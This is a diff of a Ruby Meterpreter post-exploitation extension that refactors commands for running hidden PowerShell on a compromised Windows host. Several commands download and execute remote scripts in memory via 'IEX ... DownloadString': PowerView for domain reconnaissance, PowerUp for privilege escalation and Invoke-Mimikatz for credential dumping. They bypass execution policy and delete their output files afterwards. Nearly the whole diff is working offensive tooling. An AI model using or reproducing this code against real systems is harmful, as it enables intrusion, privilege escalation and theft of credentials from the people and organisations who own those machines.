@@ -156,184 +156,132 @@ Ref: https://github.com/HarmJ0y/PowerUp
   end
 
   #
-  # Displays the contents of the SAM database
+  # HELPER: Sets up the command.
   #
-  def cmd_power_shell(*args)
+  def ps_setup(args, &block)
     output_file = nil
     c_time      = 10
     @@command_opts.parse(args) do |opt, idx, val|
-      print_warning("OPT FOUND: #{opt}=#{val}")
       case opt
       when '-o'
         output_file = val
+        2.times { args.shift }
       when '-t'
         begin
           c_time = Integer(val)
           print_warning("Output timeout: #{val} seconds")
+          2.times { args.shift }
         rescue
           print_error "#{val} is not a valid Integer."
           return false
         end
       when '-h'
-        print_line(POWER_SHELL_USAGE)
-        print_line("-" * 60)
-        print("Usage: power_shell [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
-              "Runs a direct Powershell command.\n" +
-              @@command_opts.usage)
-        return true
+        yield if block_given?
       end
     end  
-    output  = "#{rand(100000)}"
-    ps_cmd  = args.join(" ")
-    client.sys.process.execute("powershell -nop -exec bypass -c #{ps_cmd} >> %%TEMP%%\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
+    output   = "#{rand(1000000)}"
+    ps_cmd   = args.join(" ")
+    tmp_dir  = client.fs.file.expand_path("%temp%")
+    tmp_file = "#{tmp_dir}\\#{output}"
+
+    return output_file, c_time, ps_cmd, tmp_file
+  end
+
+  #
+  # HELPER: Executes powershell on the host.
+  #
+  def ps_exec(command, tmp_file, c_time, output_file)
+    encoding_options = {
+      :invalid           => :replace,  # Replace invalid byte sequences
+      :undef             => :replace,  # Replace anything not defined in ASCII
+      :replace           => '',        # Use a blank for those replacements
+      :universal_newline => false       # Always break lines with \n
+    }
     print_status("Sending command to client...")
+    client.sys.process.execute(command, nil, {'Hidden' => 'true', 'Channelized' => true})
     sleep(c_time)
-    log_file = client.fs.file.new("%%TEMP%%\\#{output}", "rb")
+    log_file = client.fs.file.new(tmp_file, "rb")
     begin
       while ((data = log_file.read) != nil)
         data.strip!
-        print_line(data)
+        print_line(data.encode(::Encoding.find('ASCII'), encoding_options))
       end
     rescue EOFError
     ensure
       log_file.close
     end
+    client.sys.process.execute("cmd /c del #{tmp_file}", nil, {'Hidden' => 'true', 'Channelized' => true})
+  end
 
-    client.sys.process.execute("cmd /c del %%TEMP%%\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
+  #
+  # Direct PowerShell Commands
+  #
+  def cmd_power_shell(*args)
+    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+      print_line(POWER_SHELL_USAGE)
+      print_line("-" * 60)
+      print("Usage: power_shell [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
+            "Runs a direct Powershell command.\n" +
+            @@command_opts.usage)
+      return true
+    end
+    command = "powershell -nop -exec bypass -c #{ps_cmd} >> #{tmp_file}"
+    ps_exec(command, tmp_file, c_time, output_file)
     return true
   end
 
+  # 
+  # PowerView Framework
+  #
   def cmd_power_view(*args)
-    output_file = nil
-    c_time      = 10
-    @@command_opts.parse(args) do |opt, idx, val|
-      case opt
-      when '-o'
-        output_file = val
-      when '-t'
-        begin
-          c_time = Integer(val)
-          print_warning("Output timeout: #{val} seconds")
-        rescue
-          print_error "#{val} is not a valid Integer."
-        end
-      when '-h'
-        print_line(POWER_VIEW_USAGE)
-        print_line("-" * 60)
-        print("Usage: power_view [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
-              "Runs the Veil PowerView framework on the remote host.\n" +
-              @@command_opts.usage)
-        return true
-      end
-    end
     link = 'https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1'
-    output  = "#{rand(100000)}"
-    ps_cmd  = args.join(" ")
-    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    print_status("Sending command to client...")
-    sleep(c_time)
-    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
-    begin
-      while ((data = log_file.read) != nil)
-        data.strip!
-        print_line(data)
-      end
-    rescue EOFError
-    ensure
-      log_file.close
+    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+      print_line(POWER_VIEW_USAGE)
+      print_line("-" * 60)
+      print("Usage: power_view [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
+            "Runs the Veil PowerView framework on the remote host.\n" +
+            @@command_opts.usage)
+      return true
     end
-
-    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    return true
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> #{tmp_file}"
+    ps_exec(command, tmp_file, c_time, output_file)
+    return true    
   end
 
+  #
+  # PowerUp Framework
+  #
   def cmd_power_up(*args)
-    output_file = nil
-    c_time      = 10
-    @@command_opts.parse(args) do |opt, idx, val|
-      case opt
-      when '-o'
-        output_file = val
-      when '-t'
-        begin
-          c_time = Integer(val)
-          print_warning("Output timeout: #{val} seconds")
-        rescue
-          print_error "#{val} is not a valid Integer."
-        end
-      when '-h'
-        print_line(POWER_UP_USAGE)
-        print_line("-" * 60)
-        print("Usage: power_up [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
-              "Runs Harmj0y's PowerUp framework on the remote host.\n" +
-              @@command_opts.usage)
-        return true
-      end
+    link = 'https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1'
+    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+      print_line(POWER_UP_USAGE)
+      print_line("-" * 60)
+      print("Usage: power_up [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
+            "Runs Harmj0y's PowerUp framework on the remote host.\n" +
+            @@command_opts.usage)
+      return true
     end
-    link = 'https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1'    
-    output  = "#{rand(100000)}"
-    ps_cmd  = args.join(" ")
-    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    print_status("Sending command to client...")
-    sleep(c_time)
-    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
-    begin
-      while ((data = log_file.read) != nil)
-        data.strip!
-        print_line(data)
-      end
-    rescue EOFError
-    ensure
-      log_file.close
-    end
-
-    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    return true
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> #{tmp_file}"
+    ps_exec(command, tmp_file, c_time, output_file)
+    return true        
   end
 
+  #
+  # PowerShell Mimikatz
+  #
   def cmd_power_katz(*args)
-    output_file = nil
-    c_time      = 10
-    @@command_opts.parse(args) do |opt, idx, val|
-      case opt
-      when '-o'
-        output_file = val
-      when '-t'
-        begin
-          c_time = Integer(val)
-          print_warning("Output timeout: #{val} seconds")
-        rescue
-          print_error "#{val} is not a valid Integer."
-        end
-      when '-h'
-        print_line(POWER_KATZ_USAGE)
-        print_line("-" * 60)
-        print("Usage: power_katz [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
-              "Downloads and executes Mimikatz in memory through Powershell.\n" +
-              @@command_opts.usage)
-        return true
-      end
+    link = 'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'
+    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+      print_line(POWER_KATZ_USAGE)
+      print_line("-" * 60)
+      print("Usage: power_katz [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
+            "Downloads and executes Mimikatz in memory through Powershell.\n" +
+            @@command_opts.usage)
+      return true
     end
-    link = 'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'    
-    output  = "#{rand(100000)}"
-    ps_cmd  = args.join(" ")
-    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    print_status("Sending command to client...")
-    print_warning("This could take a bit...")
-    sleep(c_time)
-    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
-    begin
-      while ((data = log_file.read) != nil)
-        data.strip!
-        print_line(data)
-      end
-    rescue EOFError
-    ensure
-      log_file.close
-    end
-
-    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    return true
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\" >> #{tmp_file}"
+    ps_exec(command, tmp_file, c_time, output_file)
+    return true            
   end
 
 end
